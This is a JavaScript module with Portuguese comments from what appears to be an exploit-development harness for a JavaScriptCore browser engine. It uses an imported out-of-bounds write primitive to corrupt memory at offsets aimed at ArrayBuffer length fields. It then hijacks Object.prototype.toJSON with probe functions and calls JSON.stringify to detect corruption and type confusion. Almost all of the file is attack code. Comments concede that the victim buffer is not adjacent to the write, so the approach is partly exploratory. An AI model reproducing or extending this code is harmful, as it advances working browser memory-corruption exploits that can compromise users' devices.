// js/script3/testVictimABInstability.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; // Adicionado JSC_OFFSETS para referência futura

// --- Variantes da toJSON para sondar victim_ab (ArrayBuffer) ---

export function toJSON_AB_Probe_V1() {
    const FNAME_toJSON = "toJSON_AB_Probe_V1";
    let result = {
        toJSON_variant: FNAME_toJSON,
        this_type_entry: Object.prototype.toString.call(this),
        is_identified_as_array_buffer: false,
        byteLength_prop: "N/A",
        is_dataview_created: false,
        dv_write_val: 0xBADDBADD,
        dv_read_val: "N/A",
        dv_rw_match: false,
        error: null
    };

    if (result.this_type_entry !== "[object ArrayBuffer]") {
        result.error = `this is not an ArrayBuffer (type: ${result.this_type_entry})`;
        return result;
    }
    result.is_identified_as_array_buffer = true;

    try {
        result.byteLength_prop = this.byteLength;

        if (typeof result.byteLength_prop === 'number' && result.byteLength_prop >= 4) {
            const dv = new DataView(this);
            result.is_dataview_created = true;
            dv.setUint32(0, result.dv_write_val, true);
            result.dv_read_val = dv.getUint32(0, true);
            if (result.dv_read_val === result.dv_write_val) {
                result.dv_rw_match = true;
            }
        } else {
            result.error = `Invalid byteLength for DataView ops: ${result.byteLength_prop}`;
        }
    } catch (e) {
        result.error = `${e.name}: ${e.message}`;
    }
    return result;
}

export function toJSON_AB_Probe_V2_Detailed() {
    const FNAME_toJSON = "toJSON_AB_Probe_V2_Detailed";
    let result = {
        toJSON_variant: FNAME_toJSON,
        this_type_entry: Object.prototype.toString.call(this),
        is_identified_as_array_buffer: false,
        byteLength_prop: "N/A",
        is_dataview_created: false,
        dv_rw_match: false,
        error: null,
        this_type_in_loop: "N/A",
        this_type_after_loop: "N/A",
        for_in_iterations: 0,
        loop_error: null,
    };

    if (result.this_type_entry !== "[object ArrayBuffer]") {
        result.error = `this is not an ArrayBuffer (type: ${result.this_type_entry})`;
        return result;
    }
    result.is_identified_as_array_buffer = true;

    try {
        result.byteLength_prop = this.byteLength;

        if (typeof result.byteLength_prop === 'number' && result.byteLength_prop >= 4) {
            const dv = new DataView(this);
            result.is_dataview_created = true;
            dv.setUint32(0, 0xFEEDFACE, true);
            if (dv.getUint32(0, true) === 0xFEEDFACE) result.dv_rw_match = true;
        } else {
             result.error = `Invalid byteLength for DataView ops: ${result.byteLength_prop}`;
        }

        try {
            for (const prop in this) {
                if (result.for_in_iterations === 0) {
                    result.this_type_in_loop = Object.prototype.toString.call(this);
                }
                result.for_in_iterations++;
                if (result.for_in_iterations > 100) {
                     break;
                }
            }
        } catch (loop_e) {
            result.loop_error = `${loop_e.name}: ${loop_e.message}`;
        }
        result.this_type_after_loop = Object.prototype.toString.call(this);

    } catch (e) {
        result.error = `${e.name}: ${e.message}`;
    }
    return result;
}

export async function executeVictimABInstabilityTest(victim_ab, corruption_offset_in_oob_ab, value_to_write, victim_ab_size_val, toJSONFunctionName, toJSONFunctionToUse) {
    const FNAME_TEST = "executeVictimABInstabilityTest";
    logS3(`--- Sub-Teste de Instabilidade em ArrayBuffer ---`, "subtest", FNAME_TEST);
    logS3(`  Alvo: victim_ab (tamanho esperado: ${victim_ab_size_val})`, "info", FNAME_TEST);
    logS3(`  Corrupção: Escrever ${toHex(value_to_write)} em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]`, "info", FNAME_TEST);
    logS3(`  Sonda JSON: ${toJSONFunctionName}`, "info", FNAME_TEST);

    let result = {
        stringifyError: null,
        parsedToJSONReturn: null, // Renomeado para clareza
        corruption_offset: corruption_offset_in_oob_ab,
        value_written: value_to_write,
        probe_function: toJSONFunctionName,
        final_verdict_is_problem: false
    };

    let originalToJSONDescriptor = null;
    let pollutionApplied = false;
    const ppKey_val = "toJSON";

    try {
        if (!triggerOOB_primitive()) {
            logS3("Falha ao inicializar ambiente OOB. Abortando sub-teste.", "critical", FNAME_TEST);
            result.stringifyError = { name: "OOBSetupError", message: "triggerOOB_primitive failed" };
            return result;
        }
        if (!oob_write_absolute(corruption_offset_in_oob_ab, value_to_write, 4)) {
            logS3("Falha ao escrever valor de corrupção. Abortando sub-teste.", "error", FNAME_TEST);
            result.stringifyError = { name: "OOBWriteError", message: "oob_write_absolute failed" };
            return result;
        }
        logS3("   Valor de corrupção escrito com sucesso.", "good", FNAME_TEST);
        await PAUSE_S3(SHORT_PAUSE_S3);

        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSONFunctionToUse,
            writable: true,
            enumerable: false,
            configurable: true
        });
        pollutionApplied = true;
        logS3(`   Object.prototype.toJSON poluído com ${toJSONFunctionName}.`, "info", FNAME_TEST);

        logS3("   Chamando JSON.stringify(victim_ab)...", "info", FNAME_TEST);
        let rawToJSONReturn = null;
        try {
            rawToJSONReturn = JSON.stringify(victim_ab); // Isso chama nossa toJSON, que retorna um objeto
            // Agora tentamos parsear o que a NOSSA toJSON retornou, que JSON.stringify transformou em string.
            // No entanto, JSON.stringify já retorna o objeto que nossa toJSON retornou, não uma string dele.
            // A linha anterior `result.toJSONReturn = stringify_output` estava correta. O `typeof` é que estava me enganando no log.
            // JSON.stringify(obj) -> chama obj.toJSON() -> se toJSON retorna um objeto, ELA É USADA.
            // Portanto, rawToJSONReturn já é o objeto da nossa sonda.
            result.parsedToJSONReturn = rawToJSONReturn;

            logS3(`   JSON.stringify invocou toJSON. Retorno da toJSON (tipo: ${typeof result.parsedToJSONReturn}): ${typeof result.parsedToJSONReturn === 'object' ? JSON.stringify(result.parsedToJSONReturn) : result.parsedToJSONReturn}`, "info", FNAME_TEST);

        } catch (e_str) {
            result.stringifyError = { name: e_str.name, message: e_str.message, stack: e_str.stack };
            logS3(`   !!!! ERRO AO STRINGIFY victim_ab !!!!: ${e_str.name} - ${e_str.message}`, "error", FNAME_TEST);
            if (e_str.stack) logS3(`       Stack: ${e_str.stack}`, "error");
        }

    } catch (e_main_test_logic) {
        logS3(`Erro na lógica principal do sub-teste: ${e_main_test_logic.message}`, "error", FNAME_TEST);
        if (!result.stringifyError) result.stringifyError = { name: "MainTestLogicError", message: e_main_test_logic.message };
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }
    
    // Análise do resultado
    const tr = result.parsedToJSONReturn; // Alias para o objeto retornado pela nossa sonda

    if (tr && typeof tr === 'object' && tr !== null) {
        if (!tr.is_identified_as_array_buffer) {
            result.final_verdict_is_problem = true;
            logS3(`      toJSONReturn indica que 'this' não foi identificado como ArrayBuffer (tipo real: ${tr.this_type_entry}).`, "error", FNAME_TEST);
        } else if (tr.error) {
            result.final_verdict_is_problem = true;
            logS3(`      toJSONReturn reportou erro interno: ${tr.error}.`, "error", FNAME_TEST);
        } else if (tr.loop_error && tr.toJSON_variant === "toJSON_AB_Probe_V2_Detailed") {
             result.final_verdict_is_problem = true;
             logS3(`      toJSONReturn (V2) reportou erro no loop: ${tr.loop_error}.`, "error", FNAME_TEST);
        } else { // Identificado como AB e sem erros diretos, checar anomalias
            let anomaly_found = false;
            if (tr.byteLength_prop !== victim_ab_size_val) {
                anomaly_found = true;
                logS3(`      ANOMALIA: byteLength_prop (${tr.byteLength_prop}) !== esperado (${victim_ab_size_val})`, "critical", FNAME_TEST);
            }
            if (!tr.dv_rw_match) {
                anomaly_found = true;
                logS3(`      ANOMALIA: dv_rw_match é false. Leitura/escrita no DataView falhou ou retornou valor incorreto.`, "critical", FNAME_TEST);
            }
            if (tr.toJSON_variant === "toJSON_AB_Probe_V2_Detailed") {
                if (tr.this_type_in_loop !== "[object ArrayBuffer]" && tr.this_type_in_loop !== "N/A" && tr.for_in_iterations > 0) {
                    anomaly_found = true;
                    logS3(`      ANOMALIA (V2): this_type_in_loop é ${tr.this_type_in_loop}`, "critical", FNAME_TEST);
                }
                if (tr.this_type_after_loop !== "[object ArrayBuffer]") {
                    anomaly_found = true;
                    logS3(`      ANOMALIA (V2): this_type_after_loop é ${tr.this_type_after_loop}`, "critical", FNAME_TEST);
                }
            }
            if (anomaly_found) {
                result.final_verdict_is_problem = true;
            }
        }
    } else {
        logS3(`      toJSONReturn não é um objeto válido ou é nulo. Valor: ${tr}`, "warn", FNAME_TEST);
        // Se não há toJSONReturn mas houve um erro de stringify, isso já é um problema.
        if (!result.stringifyError) {
            // Poderia marcar como problema se esperamos sempre um objeto da sonda.
            // result.final_verdict_is_problem = true;
        }
    }

    if (result.stringifyError && result.stringifyError.name === 'RangeError') {
        logS3(`   ---> RangeError: Maximum call stack size exceeded OCORREU com ${toJSONFunctionName} para victim_ab!`, "vuln", FNAME_TEST);
        document.title = `RangeError with ${toJSONFunctionName} on victim_ab!`;
        result.final_verdict_is_problem = true;
    } else if (result.stringifyError) {
        logS3(`   ---> Erro durante JSON.stringify: ${result.stringifyError.name} - ${result.stringifyError.message}`, "error", FNAME_TEST);
        result.final_verdict_is_problem = true;
    }

    if (result.final_verdict_is_problem) {
        logS3(`   PROBLEMA DETECTADO com ${toJSONFunctionName} para victim_ab.`, "critical", FNAME_TEST);
        document.title = `PROBLEMA ${toJSONFunctionName} victim_ab (${toHex(value_to_write)}@${toHex(corruption_offset_in_oob_ab)})`;
    } else {
        logS3(`   ${toJSONFunctionName} para victim_ab completou sem problemas óbvios detectados.`, "good", FNAME_TEST);
    }

    logS3(`--- Sub-Teste de Instabilidade em ArrayBuffer CONCLUÍDO ---`, "subtest", FNAME_TEST);
    return result;
}

export async function runAllInstabilityTestsOnVictimAB() {
    const FNAME_RUNNER = "runAllInstabilityTestsOnVictimAB";
    logS3(`==== INICIANDO Teste Completo de Instabilidade em ArrayBuffer Vítima ====`, "test", FNAME_RUNNER);

    const victim_ab_size = 64; // Tamanho padrão do ArrayBuffer vítima
    let victim_ab = null;
    let overall_problem_found = false;

    const corruption_params_to_try = [
        { name: "Offset -16 (0x70), Val 0xFFFFFFFF", offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, value: 0xFFFFFFFF },
        { name: "Offset -16 (0x70), Val 0x00000000", offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, value: 0x00000000 },
        { name: "Offset -16 (0x70), Val 0x12345678", offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, value: 0x12345678 },
        { name: "Offset +0 (0x80 Base DV), Val 0xFFFFFFFF", offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128), value: 0xFFFFFFFF },
        // Tentar corromper o JSArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START (0x18)
        // Se victim_ab estivesse em 0x90 (hipoteticamente após oob_dataview_real), seu byteLength estaria em 0x90 + 0x18 = 0xA8
        // Nosso oob_array_buffer_real é o único buffer sendo escrito.
        // Vamos tentar um offset que seria o byteLength do ArrayBuffer se ele fosse o OOB_CONFIG.BASE_OFFSET_IN_DV
        { name: "Offset byteLength (0x18) de um AB em BASE_OFFSET_IN_DV, Val 0xFFFFFFFF", offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) + (JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START || 0x18), value: 0xFFFFFFFF},
        { name: "Offset byteLength (0x18) de um AB em BASE_OFFSET_IN_DV, Val 0x00000100 (256)", offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) + (JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START || 0x18), value: 0x00000100},
    ];

    const toJSON_Probes = [
        { name: "toJSON_AB_Probe_V1", func: toJSON_AB_Probe_V1 },
        { name: "toJSON_AB_Probe_V2_Detailed", func: toJSON_AB_Probe_V2_Detailed },
    ];

    for (const params of corruption_params_to_try) {
        logS3(`\n[${FNAME_RUNNER}] Testando Parâmetros de Corrupção: ${params.name}`, "test", FNAME_RUNNER);
        // O victim_ab é o alvo da chamada JSON.stringify.
        // A corrupção ocorre no oob_array_buffer_real.
        // Para este teste ter sentido, o victim_ab DEVE ser o oob_array_buffer_real ou uma view sobre ele,
        // OU precisamos de um spray para que victim_ab (separado) fique adjacente.
        // Por ora, vamos assumir que estamos tentando corromper o oob_array_buffer_real e sondando-o.
        // No entanto, o teste cria um 'new ArrayBuffer(victim_ab_size)' que é o 'victim_ab' sondado.
        // Isso significa que a escrita OOB no 'oob_array_buffer_real' precisa afetar este 'victim_ab' separado.
        // Isso requer que o 'victim_ab' esteja adjacente à escrita.
        // VAMOS manter a lógica como está por enquanto, mas cientes dessa desconexão.
        victim_ab = new ArrayBuffer(victim_ab_size);
        logS3(`   Novo victim_ab (${victim_ab_size} bytes) criado. Este é o objeto que será passado para JSON.stringify.`, "info", FNAME_RUNNER);
        logS3(`   Lembrete: A escrita OOB ocorre em 'oob_array_buffer_real'. A detecção de corrupção depende da adjacência e do vazamento da escrita.`, "warn", FNAME_RUNNER);


        for (const probe of toJSON_Probes) {
            const test_result = await executeVictimABInstabilityTest(
                victim_ab, // Este é o objeto que JSON.stringify opera.
                params.offset, // Offset da escrita OOB DENTRO de oob_array_buffer_real
                params.value,
                victim_ab_size, // Tamanho esperado do victim_ab
                probe.name,
                probe.func
            );
            if (test_result.final_verdict_is_problem) {
                overall_problem_found = true;
            }
            await PAUSE_S3(MEDIUM_PAUSE_S3);
        }
        clearOOBEnvironment();
        await PAUSE_S3(SHORT_PAUSE_S3);
    }

    if (overall_problem_found) {
         logS3(`==== Teste Completo de Instabilidade em ArrayBuffer Vítima CONCLUÍDO: UM OU MAIS PROBLEMAS FORAM DETECTADOS. Verifique logs. ====`, "vuln", FNAME_RUNNER);
         document.title = "PROBLEMA(S) DETECTADO(S) - Teste AB Instability";
    } else {
        logS3(`==== Teste Completo de Instabilidade em ArrayBuffer Vítima CONCLUÍDO: NENHUM PROBLEMA ÓBVIO DETECTADO NAS SONDAGENS. ====`, "good", FNAME_RUNNER);
    }
}
